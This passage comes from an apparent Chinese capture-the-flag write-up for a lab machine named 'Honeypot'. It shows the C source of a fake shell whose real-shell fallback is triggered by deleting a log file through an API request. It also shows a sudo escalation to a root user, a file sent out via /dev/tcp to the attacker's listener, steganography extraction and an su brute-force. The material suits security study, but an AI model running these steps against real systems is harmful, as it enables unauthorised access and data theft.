class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/opt# <span class="hljs-built_in">cat</span> jail_v1<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;time.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;fcntl.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br><span class="hljs-comment">#include &lt;dirent.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/utsname.h&gt;</span><br><span class="hljs-comment">#include &lt;pwd.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/wait.h&gt;</span><br><span class="hljs-comment">#include &lt;errno.h&gt;</span><br><br><span class="hljs-comment">#define LOG_PATH &quot;/var/www/html/history.txt&quot;</span><br><span class="hljs-comment">#define MAX_CMD_LEN 1024  // 修改宏名称避免冲突</span><br><span class="hljs-comment">#define MAX_OUTPUT 8192</span><br><span class="hljs-comment">#define MAX_PATH 256</span><br><br>FILE *logfile;<br>char current_dir[MAX_PATH] = <span class="hljs-string">&quot;&quot;</span>;<br><br>// 记录操作日志<br>void log_activity(const char *input, const char *output) &#123;<br>    <span class="hljs-keyword">if</span> (!logfile) <span class="hljs-built_in">return</span>;<br>    <br>    time_t now = <span class="hljs-keyword">time</span>(NULL);<br>    struct tm *t = localtime(&amp;now);<br>    fprintf(logfile, <span class="hljs-string">&quot;[%04d-%02d-%02d %02d:%02d:%02d] IN: %s\n&quot;</span>, <br>            t-&gt;tm_year + 1900, t-&gt;tm_mon + 1, t-&gt;tm_mday,<br>            t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec, input);<br>    <br>    <span class="hljs-keyword">if</span> (output &amp;&amp; strlen(output) &gt; 0) &#123;<br>        fprintf(logfile, <span class="hljs-string">&quot;OUT: %s\n\n&quot;</span>, output);<br>    &#125;<br>    fflush(logfile);<br>&#125;<br><br>// 检查命令是否被允许<br>int is_command_allowed(const char *<span class="hljs-built_in">command</span>) &#123;<br>    const char *allowed[] = &#123;<br>        <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;top&quot;</span>, <span class="hljs-string">&quot;free&quot;</span>, <span class="hljs-string">&quot;df&quot;</span>, <br>        <span class="hljs-string">&quot;ifconfig&quot;</span>, <span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;uname&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>, <br>        <span class="hljs-string">&quot;history&quot;</span>, <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;clear&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; allowed[i]; i++) &#123;<br>        <span class="hljs-keyword">if</span> (strcmp(<span class="hljs-built_in">command</span>, allowed[i]) == 0) &#123;<br>            <span class="hljs-built_in">return</span> 1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// 检查命令是否试图修改文件系统<br>int is_file_modification_command(const char *<span class="hljs-built_in">command</span>) &#123;<br>    const char *modifiers[] = &#123;<br>        <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;rm&quot;</span>, <span class="hljs-string">&quot;mv&quot;</span>, <span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <br>        <span class="hljs-string">&quot;mkdir&quot;</span>, <span class="hljs-string">&quot;chmod&quot;</span>, <span class="hljs-string">&quot;chown&quot;</span>, <span class="hljs-string">&quot;nano&quot;</span>, <span class="hljs-string">&quot;vi&quot;</span>, <span class="hljs-string">&quot;vim&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <br>        <span class="hljs-string">&quot;tee&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;tar&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;zip&quot;</span>, <span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;awk&quot;</span>, <br>        <span class="hljs-string">&quot;find&quot;</span>, <span class="hljs-string">&quot;git&quot;</span>, <span class="hljs-string">&quot;svn&quot;</span>, <span class="hljs-string">&quot;wget&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;scp&quot;</span>, <span class="hljs-string">&quot;rsync&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; modifiers[i]; i++) &#123;<br>        <span class="hljs-keyword">if</span> (strstr(<span class="hljs-built_in">command</span>, modifiers[i])) &#123;<br>            <span class="hljs-built_in">return</span> 1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// 过滤输出中的xxxx敏感信息<br>void filter_xxxx_output(char *output) &#123;<br>    char *patterns[] = &#123;<br>        <span class="hljs-string">&quot;xxxx&quot;</span>, <span class="hljs-string">&quot;xxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxx&quot;</span>, <br>        <span class="hljs-string">&quot;/xxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; patterns[i]; i++) &#123;<br>        char *pos = output;<br>        <span class="hljs-keyword">while</span> ((pos = strstr(pos, patterns[i]))) &#123;<br>            memset(pos, <span class="hljs-string">&#x27;x&#x27;</span>, strlen(patterns[i]));<br>            pos += strlen(patterns[i]);<br>        &#125;<br>    &#125;<br>&#125;<br><br>// 执行命令并获取输出<br>void execute_command(const char *input, char *output) &#123;<br>    // 检查命令是否被允许<br>    char command_copy[MAX_CMD_LEN];<br>    strncpy(command_copy, input, MAX_CMD_LEN);<br>    char *first_token = strtok(command_copy, <span class="hljs-string">&quot; &quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!first_token || !is_command_allowed(first_token)) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;-bash: %s: command not found&quot;</span>, input);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    // 检查文件修改操作<br>    <span class="hljs-keyword">if</span> (is_file_modification_command(input)) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;-bash: %s: Permission denied&quot;</span>, input);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    // 创建管道<br>    int pipefd[2];<br>    <span class="hljs-keyword">if</span> (pipe(pipefd) == -1) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;pipe error: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    pid_t pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; 0) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;fork error: %s&quot;</span>, strerror(errno));<br>        close(pipefd[0]);<br>        close(pipefd[1]);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (pid == 0) &#123; // 子进程<br>        close(pipefd[0]); // 关闭读端<br>        <br>        // 重定向标准输出和错误输出到管道<br>        dup2(pipefd[1], STDOUT_FILENO);<br>        dup2(pipefd[1], STDERR_FILENO);<br>        close(pipefd[1]);<br>        <br>        // 解析命令参数<br>        char *args[64];<br>        int i = 0;<br>        <br>        char *token = strtok((char *)input, &quot; &quot;);<br>        while (token != NULL &amp;&amp; i &lt; <span class="hljs-number">63</span>) &#123;<br>            args[i++] = token;<br>            token = strtok(NULL, &quot; &quot;);<br>        &#125;<br>        args[i] = NULL;<br>        <br>        // 执行命令<br>        execvp(args[<span class="hljs-number">0</span>], args);<br>        <br>        // 如果execvp失败<br>        fprintf(stderr, &quot;execvp failed: %s&quot;, strerror(errno));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125; <span class="hljs-keyword">else</span> &#123; // 父进程<br>        close(pipefd[1]); // 关闭写端<br>        <br>        // 读取命令输出<br>        output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        char buffer[256];<br>        ssize_t count;<br>        <br>        <span class="hljs-keyword">while</span> ((count = read(pipefd[<span class="hljs-number">0</span>], buffer, sizeof(buffer) - <span class="hljs-number">1</span>)) &gt; 0) &#123;<br>            buffer[count] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (strlen(output) + count &lt; MAX_OUTPUT - 1) &#123;<br>                strcat(output, buffer);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                strncat(output, buffer, MAX_OUTPUT - strlen(output) - 1);<br>                <span class="hljs-built_in">break</span>;<br>            &#125;<br>        &#125;<br>        close(pipefd[0]);<br>        <br>        // 等待子进程结束<br>        waitpid(pid, NULL, 0);<br>        <br>        // 过滤xxxx敏感信息<br>        filter_xxxx_output(output);<br>    &#125;<br>&#125;<br><br>// 初始化日志文件<br>int <span class="hljs-function"><span class="hljs-title">init_logging</span></span>() &#123;<br>    // 检查日志文件是否存在<br>    <span class="hljs-keyword">if</span> (access(LOG_PATH, F_OK) != 0) &#123;<br>        <span class="hljs-built_in">return</span> 0;<br>    &#125;<br>    <br>    // 确保日志目录存在<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/var/www&quot;</span>, 0777);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/var/www/html&quot;</span>, 0777);<br>    <br>    // 打开日志文件<br>    logfile = fopen(LOG_PATH, <span class="hljs-string">&quot;a&quot;</span>);<br>    <span class="hljs-keyword">if</span> (logfile == NULL) &#123;<br>        <span class="hljs-built_in">return</span> -1;<br>    &#125;<br>    <br>    // 设置文件权限<br>    <span class="hljs-built_in">chmod</span>(LOG_PATH, 0644);<br>    <span class="hljs-built_in">return</span> 1;<br>&#125;<br><br>// 启动真实的 shell<br>void <span class="hljs-function"><span class="hljs-title">launch_real_shell</span></span>() &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Warning: Log file not found, launching real shell environment\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;System maintenance mode activated\n&quot;</span>);<br>    <br>    // 执行真实的 shell<br>    execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, NULL);<br>    <span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br>int <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>    char input[MAX_CMD_LEN];<br>    char output[MAX_OUTPUT];<br>    <br>    // 初始化当前目录<br>    <span class="hljs-keyword">if</span> (getcwd(current_dir, sizeof(current_dir)) == NULL) &#123;<br>        strcpy(current_dir, <span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>    <br>    // 初始化日志 - 检查文件是否存在<br>    int log_status = init_logging();<br>    <br>    // 如果日志文件不存在，启动真实 shell<br>    <span class="hljs-keyword">if</span> (log_status == 0) &#123;<br>        launch_real_shell();<br>        <span class="hljs-built_in">return</span> 0;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (log_status == -1) &#123;<br>        fprintf(stderr, <span class="hljs-string">&quot;Critical error: Failed to initialize logging system\n&quot;</span>);<br>        <span class="hljs-built_in">return</span> 1;<br>    &#125;<br>    <br>    // 清屏<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[H\033[J&quot;</span>);<br>    <br>    // 显示登录横幅<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Honeypot Terminal v2.0 - Restricted Environment\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Last login: %s from 192.168.1.123\n&quot;</span>, ctime(&amp;(time_t)&#123;<span class="hljs-keyword">time</span>(NULL) - 3600&#125;));<br>    <br>    // 主循环<br>    <span class="hljs-keyword">while</span> (1) &#123;<br>        // 打印提示符<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[1;32muser@honeypot\033[0m:\033[1;34m%s\033[0m# &quot;</span>, <br>               strcmp(current_dir, <span class="hljs-string">&quot;/xxxx&quot;</span>) == 0 ? <span class="hljs-string">&quot;~&quot;</span> : current_dir);<br>        fflush(stdout);<br>        <br>        // 读取用户输入<br>        <span class="hljs-keyword">if</span> (fgets(input, sizeof(input), stdin) == NULL) &#123;<br>            <span class="hljs-built_in">break</span>;<br>        &#125;<br>        <br>        // 移除换行符<br>        input[strcspn(input, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <br>        // 跳过空输入<br>        <span class="hljs-keyword">if</span> (strlen(input) == 0) &#123;<br>            <span class="hljs-built_in">continue</span>;<br>        &#125;<br>        <br>        // 记录输入<br>        log_activity(input, NULL);<br>        <br>        // 特殊处理<span class="hljs-built_in">cd</span>命令<br>        <span class="hljs-keyword">if</span> (strncmp(input, <span class="hljs-string">&quot;cd&quot;</span>, 2) == 0) &#123;<br>            char *path = strchr(input, <span class="hljs-string">&#x27; &#x27;</span>);<br>            <span class="hljs-keyword">if</span> (path) &#123;<br>                path++;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chdir</span>(path) != 0) &#123;<br>                    snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;bash: cd: %s: %s&quot;</span>, path, strerror(errno));<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    getcwd(current_dir, sizeof(current_dir));<br>                    output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br>                getcwd(current_dir, sizeof(current_dir));<br>                output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>        &#125; <br>        // 特殊处理<span class="hljs-built_in">exit</span>/logout<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcmp(input, <span class="hljs-string">&quot;exit&quot;</span>) == 0 || strcmp(input, <span class="hljs-string">&quot;logout&quot;</span>) == 0) &#123;<br>            strcpy(output, <span class="hljs-string">&quot;logout&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output);<br>            log_activity(input, output);<br>            <span class="hljs-built_in">break</span>;<br>        &#125; <br>        // 特殊处理clear<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcmp(input, <span class="hljs-string">&quot;clear&quot;</span>) == 0) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[H\033[J&quot;</span>);<br>            output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<br>        // 处理其他命令<br>        <span class="hljs-keyword">else</span> &#123;<br>            execute_command(input, output);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output);<br>        &#125;<br>        <br>        // 记录输出<br>        log_activity(input, output);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>根据代码的注释，发现只要日志文件<code>LOG_PATH</code>不存在就会启动真实的SHELL<br>那么<code>#define LOG_PATH &quot;/var/www/html/history.txt&quot;</code>，删除<code>history.txt</code>文件即可</p>
+<p>重新构造一个JSON请求，去删除文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/manage.php HTTP/1.1<br>Host: 192.168.2.41<br>Cache-Control: max-age=0<br>Authorization: Basic cm9vdDp0b29y<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Content-Type: <span class="hljs-string">&quot;application/json&quot;</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 97<br><br>&#123;<br>  <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;file_delete&quot;</span>,<br>  <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/var/www/html/history.txt&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302257792.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>重新连接SSH</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># ssh root@192.168.2.41                                                                                                          </span><br> _   _                                    _   <br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> ___  _ __   ___ _   _ _ __   ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ </span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ _ \</span>|<span class="hljs-string"> &#x27;_ \ / _ \ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> &#x27;_ \ / _ \</span>|<span class="hljs-string"> __</span>|<br>|<span class="hljs-string">  _  </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  __/ </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ </span><br><span class="hljs-string"></span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___</span>|<span class="hljs-string">\__, </span>|<span class="hljs-string"> .__/ \___/ \__</span>|<br>                        |<span class="hljs-string">___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string">             </span><br><span class="hljs-string">root@192.168.2.41&#x27;s password: </span><br><span class="hljs-string">Linux Honeypot 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Mon Jun 30 10:47:00 2025 from 192.168.2.4</span><br><span class="hljs-string">Warning: Log file not found, launching real shell environment</span><br><span class="hljs-string">System maintenance mode activated</span><br><span class="hljs-string">sh-5.0$ id</span><br><span class="hljs-string">uid=1001(root) gid=1001(root) groups=1001(root)</span><br><span class="hljs-string">sh-5.0$ bash</span><br><span class="hljs-string">root@Honeypot:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>再次执行<code>sudo -l</code>，发现不需要密码即可执行<code>/bin/bash</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> root on Honeypot:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User root may run the following commands on Honeypot:<br>    (ALL : ALL) NOPASSWD: /usr/bin/bash<br>root@Honeypot:~$ <br></code></pre></td></tr></table></figure>
+
+<p>直接执行，发现还没有变化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> /bin/bash<br>root@Honeypot:~$ <span class="hljs-built_in">id</span><br>uid=1001(root) gid=1001(root) <span class="hljs-built_in">groups</span>=1001(root)<br></code></pre></td></tr></table></figure>
+
+<p>由于bash是 root 的 ，而真正的root是<code>toor</code>，故需要对用户进行切换</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> -u toor /usr/bin/bash<br>toor@Honeypot:/home/root# <span class="hljs-built_in">id</span><br>uid=0(toor) gid=0(toor) <span class="hljs-built_in">groups</span>=0(toor)<br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight plaintext"><figcaption><span>cat root.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bashtoor@Honeypot:~#">flag&#123;root-771e84c4-5494-11f0-9a89-b70422752e89&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>在<code>/var/backups</code>里面有一个文件<code>xqa.jpg</code><br>发送到自己的kali上面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:/var/backups$ <span class="hljs-built_in">cat</span> xqa.jpg &gt; /dev/tcp/192.168.2.4/4444<br></code></pre></td></tr></table></figure>
+
+<p>kali：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nc -lvnp 4444 &gt; 1.jpg                                             <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.41] 43448<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>stegseek</code>解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# stegseek 1.jpg     <br>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek<br><br>[i] Found passphrase: <span class="hljs-string">&quot;&quot;</span><br>[i] Original filename: <span class="hljs-string">&quot;hello.zip&quot;</span>.<br>[i] Extracting to <span class="hljs-string">&quot;1.jpg.out&quot;</span>.<br></code></pre></td></tr></table></figure>
+
+<p>解密出来两个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# unzip -l 1.jpg.out<br>Archive:  1.jpg.out<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>      168  2025-05-29 23:10   generate_by_username.sh<br>     3605  2025-05-31 09:48   muban.key<br>---------                     -------<br>     3773                     2 files<br></code></pre></td></tr></table></figure>
+
+<p>发现是生成的密码的脚本，直接进行生成</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# bash generate_by_username.sh toor &gt; pass.txt<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>suForce</code>进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ ./suForce -u toor -w pass.txt <br>            _____                          <br> ___ _   _ |  ___|__  _ __ ___ ___   <br>/ __| | | || |_ / _ \| <span class="hljs-string">&#x27;__/ __/ _ \ </span><br><span class="hljs-string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span><br><span class="hljs-string">|___/\__,_||_|  \___/|_|  \___\___|  </span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string"> code: d4t4s3c     